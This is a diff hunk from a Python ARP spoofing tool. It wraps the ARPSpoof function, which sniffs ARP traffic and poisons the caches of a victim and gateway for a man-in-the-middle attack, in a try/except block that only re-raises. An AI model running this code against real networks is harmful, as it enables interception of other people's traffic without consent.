@@ -62,18 +62,21 @@ def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, silent = True, mitm 
     gateway = User(gateway_ip)
     gateway.get_mac()
     arp = ARP(attacker, victim, gateway, interface)
-    if n_times <= 0:
-        while True:
-            #arp.spoof(mitm)
-            if silent:
-                pkt = sniff(count=1, filter="arp")
-                if(pkt[0]["ARP"].pdst == victim_ip or pkt[0]["ARP"].pdst == gateway_ip) :
+    try:
+        if n_times <= 0:
+            while True:
+                #arp.spoof(mitm)
+                if silent:
+                    pkt = sniff(count=1, filter="arp")
+                    if(pkt[0]["ARP"].pdst == victim_ip or pkt[0]["ARP"].pdst == gateway_ip) :
+                        arp.spoof(mitm)
+                else:
                     arp.spoof(mitm)
-            else:
-                arp.spoof(mitm)
-                time.sleep(wait_time)
-    else:
-        arp.spoof()
+                    time.sleep(wait_time)
+        else:
+            arp.spoof()
+    except:
+        raise
 
 
 if __name__ == '__main__':
